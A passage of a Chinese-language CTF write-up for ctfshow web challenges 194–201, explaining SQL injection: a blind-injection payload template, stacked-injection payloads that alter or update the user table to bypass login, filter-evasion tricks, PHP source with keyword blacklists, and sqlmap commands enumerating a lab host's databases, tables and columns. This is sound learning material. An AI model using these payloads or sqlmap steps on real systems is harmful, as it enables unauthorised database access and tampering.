<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token string-interpolation string" style="color:#e3116c">f&quot;&#x27; or if((select group_concat(f1ag) from ctfshow_flxg) like &#x27;</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">pay</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">&#x27;,1,0)#&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
</blockquote>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web194">web194<a href="#web194" class="hash-link" aria-label="Direct link to web194" title="Direct link to web194">​</a></h3>
<p>返回逻辑</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">  //密码检测</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  if(!is_numeric($password)){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    $ret[&#x27;msg&#x27;]=&#x27;密码只能为数字&#x27;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    die(json_encode($ret));</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  //密码判断</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  if($row[&#x27;pass&#x27;]==$password){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      $ret[&#x27;msg&#x27;]=&#x27;登陆成功&#x27;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  //TODO:感觉少了个啥，奇怪</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    if(preg_match(&#x27;/file|into|ascii|ord|hex|substr|char|left|right|substring/i&#x27;, $username)){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        $ret[&#x27;msg&#x27;]=&#x27;用户名非法&#x27;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        die(json_encode($ret));</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>不影响，继续193</p>
<p>当然还能注意到feng说y4用到了locate</p>
<p><code>LOCATE(substr,str), LOCATE(substr,str,pos):第一种语法返回字串符substr在字符串str第一个出现的位置。第二个语法返回串substr在字符串str，位置pos处开始第一次出现的位置。返回值为0，substr不在str.</code></p>
<p>当然能看出来，locate和like差别不大</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web195">web195<a href="#web195" class="hash-link" aria-label="Direct link to web195" title="Direct link to web195">​</a></h3>
<p>返回逻辑</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">  //密码检测</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  if(!is_numeric($password)){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    $ret[&#x27;msg&#x27;]=&#x27;密码只能为数字&#x27;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    die(json_encode($ret));</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  //密码判断</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  if($row[&#x27;pass&#x27;]==$password){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      $ret[&#x27;msg&#x27;]=&#x27;登陆成功&#x27;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  //TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  if(preg_match(&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\&#x27;|\&quot;|select|union|or|and|\x26|\x7c|file|into/i&#x27;, $username)){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    $ret[&#x27;msg&#x27;]=&#x27;用户名非法&#x27;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    die(json_encode($ret));</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  if($row[0]==$password){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      $ret[&#x27;msg&#x27;]=&quot;登陆成功 flag is $flag&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>这里很明显意思是登录成功就有flag，然后这里说了是堆叠注入，所以题目描述才是又双叒叕</p>
<p>可以看到这里过滤了空格</p>
<p>看了wp，可以用反引号`来替换空格</p>
<p>然后只需要登录就可以了，因此师傅们的wp都是直接暴力修改的密码就好了</p>
<p>所以有了</p>
<div class="language-payload codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-payload codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">username = 0;update`ctfshow_user`set`pass`=1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">然后</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">password = 1</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web196">web196<a href="#web196" class="hash-link" aria-label="Direct link to web196" title="Direct link to web196">​</a></h3>
<p>题目描述说用户名不能太长</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"> //TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  if(preg_match(&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\&#x27;|\&quot;|select|union|or|and|\x26|\x7c|file|into/i&#x27;, $username)){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    $ret[&#x27;msg&#x27;]=&#x27;用户名非法&#x27;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    die(json_encode($ret));</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  if(strlen($username)&gt;16){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    $ret[&#x27;msg&#x27;]=&#x27;用户名不能超过16个字符&#x27;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    die(json_encode($ret));</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  if($row[0]==$password){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      $ret[&#x27;msg&#x27;]=&quot;登陆成功 flag is $flag&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  }</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>当然我这种笨比的反应就是想办法拼接，或者直接16字符拿下</p>
<p>不懂，为啥师傅们都说是过滤了se1ect而不是select</p>
<p><img decoding="async" loading="lazy" alt="image-20220109205502843" src="/assets/images/image-20220109205502843-39f83d2699c08583927a4508aceeb7d6.png" width="1067" height="571" class="img_ev3q"></p>
<p>但是select确实能用</p>
<p>所以payload就是</p>
<div class="language-payload codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-payload codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">username = 1;select(1)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">password = 2333</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>因为查询不到1这个用户，所以执行了select(1)</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web197">web197<a href="#web197" class="hash-link" aria-label="Direct link to web197" title="Direct link to web197">​</a></h3>
<p>用户名可以很长</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"> //TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  if(&#x27;/\*|\#|\-|\x23|\&#x27;|\&quot;|union|or|and|\x26|\x7c|file|into|select|update|set//i&#x27;, $username)){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    $ret[&#x27;msg&#x27;]=&#x27;用户名非法&#x27;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    die(json_encode($ret));</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  if($row[0]==$password){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      $ret[&#x27;msg&#x27;]=&quot;登陆成功 flag is $flag&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  }</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>然后这里看南神的没搞懂，虽然是能拿到flag，但是在不知道是ctfshow_user的情况下是怎么弄到这个的</p>
<p>这里用feng和y4的做法</p>
<div class="language-payload codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-payload codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">username = 1;alter table `ctfshow_user` change `pass` `feng` varchar(255); alter table `ctfshow_user` change `id` `pass` varchar(255)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">然后username = 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">password从1开始爆破</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>因为这里其实是把id改成了pass，而id只是纯数字，只要匹配上了就能够回显出flag</p>
<p>还有个问题啊，我能不能写马进去呢</p>
<p>哦，过滤了，好像写不了，算了。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web198">web198<a href="#web198" class="hash-link" aria-label="Direct link to web198" title="Direct link to web198">​</a></h3>
<p>用户名可以更长</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"> //TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  if(&#x27;/\*|\#|\-|\x23|\&#x27;|\&quot;|union|or|and|\x26|\x7c|file|into|select|update|set|create|drop/i&#x27;, $username)){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    $ret[&#x27;msg&#x27;]=&#x27;用户名非法&#x27;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    die(json_encode($ret));</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  if($row[0]==$password){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      $ret[&#x27;msg&#x27;]=&quot;登陆成功 flag is $flag&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  }</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>和刚刚一样的做法</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web199">web199<a href="#web199" class="hash-link" aria-label="Direct link to web199" title="Direct link to web199">​</a></h3>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"> //TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  if(&#x27;/\*|\#|\-|\x23|\&#x27;|\&quot;|union|or|and|\x26|\x7c|file|into|select|update|set|create|drop|\(/i&#x27;, $username)){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    $ret[&#x27;msg&#x27;]=&#x27;用户名非法&#x27;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    die(json_encode($ret));</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  if($row[0]==$password){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      $ret[&#x27;msg&#x27;]=&quot;登陆成功 flag is $flag&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  }</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>就多过滤了个(</p>
<p>用南神的方法吧</p>
<div class="language-payload codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-payload codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">username = 1;show tables;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">password = ctfshow_user</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web200">web200<a href="#web200" class="hash-link" aria-label="Direct link to web200" title="Direct link to web200">​</a></h3>
<p>堆叠结束啦！payload同上</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web201">web201<a href="#web201" class="hash-link" aria-label="Direct link to web201" title="Direct link to web201">​</a></h3>
<p>居然开始让咱练习sqlmap怎么用，好！</p>
<p>kali自带sqlmap，不多说了，开整</p>
<div class="language-描述 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-描述 codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">使用--user-agent 指定agent</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">使用--referer 绕过referer检查</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>看一下network</p>
<table><thead><tr><th></th><th><a href="http://f6405b3c-b606-47bd-b2b1-443c31e912c6.challenge.ctf.show/api/?id=12&amp;page=1&amp;limit=10" target="_blank" rel="noopener noreferrer">http://f6405b3c-b606-47bd-b2b1-443c31e912c6.challenge.ctf.show/api/?id=12&amp;page=1&amp;limit=10</a></th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table>
<p>get请求访问，绕过的话看自己的访问的network复制粘贴就好了</p>
<div class="language-查看数据库 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-查看数据库 codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">查库</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sqlmap -u http://f6405b3c-b606-47bd-b2b1-443c31e912c6.challenge.ctf.show/api/?id=12 --dbs --user-agent sqlmap --referer http://f6405b3c-b606-47bd-b2b1-443c31e912c6.challenge.ctf.show/sqlmap.php</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>查出来5个，其中我们要用的肯定是ctfshow_web</p>
<div class="language-payload codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-payload codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">查表</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sqlmap -u http://f6405b3c-b606-47bd-b2b1-443c31e912c6.challenge.ctf.show/api/?id=12 --user-agent sqlmap --referer http://f6405b3c-b606-47bd-b2b1-443c31e912c6.challenge.ctf.show/sqlmap.php -D ctfshow_web --tables</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>注出来ctfshow_user</p>
<div class="language-paylod codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-paylod codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">查列</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sqlmap -u http://f6405b3c-b606-47bd-b2b1-443c31e912c6.challenge.ctf.show/api/?id=12 --user-agent sqlmap --referer http://f6405b3c-b606-47bd-b2b1-443c31e912c6.challenge.ctf.show/sqlmap.php -D ctfshow_web -T ctfshow_user --columns</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>查出来id username pass</p>
